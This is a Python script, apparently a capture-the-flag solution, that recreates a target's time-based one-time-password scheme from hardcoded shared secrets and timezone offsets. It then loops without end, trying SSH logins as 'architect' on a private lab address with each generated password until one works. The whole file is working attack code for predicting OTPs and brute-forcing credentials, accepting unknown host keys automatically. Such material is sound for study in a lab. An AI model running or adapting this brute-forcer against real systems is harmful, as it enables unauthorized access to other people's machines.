from datetime import datetime, timedelta
import time
import subprocess
from hashlib import sha256
import random
import sys
import paramiko


#shared secret token for OTP calculation
sharedSecret1 = 128939448577488
sharedSecret2 = 592988748673453
sharedSecret3 = 792513759492579

secretList = [sharedSecret1, sharedSecret2, sharedSecret3]

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    CurrentTime = int(now.strftime("%d%H%M"))
    return(CurrentTime)

def getRandom():
    ca = TimeSet('Ukraine', 4, 43, 1)
    cb = TimeSet('Germany', 13, 55, 0)
    cc = TimeSet('England', 9, 19, 1)
    cd = TimeSet('Nigeria', 1, 6, 1)
    ce = TimeSet('Denmark', -5, 18, 1)
    timeSetList = [ca, cb, cc, cd, ce]
    randomTimeSet = random.sample(timeSetList, 3)
    
    ctt = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]
    uc = ctt ^ random.choice(secretList)
    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
    t = hc[22:44]
    print(t)
    return t

while True:
    OTP = getRandom()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect('10.10.159.94', username='architect', password=OTP)
        print(f"Success with: {OTP}")
        sys.exit()
    except Exception as ex:
        print(f"Failed with: {OTP}")
        continue
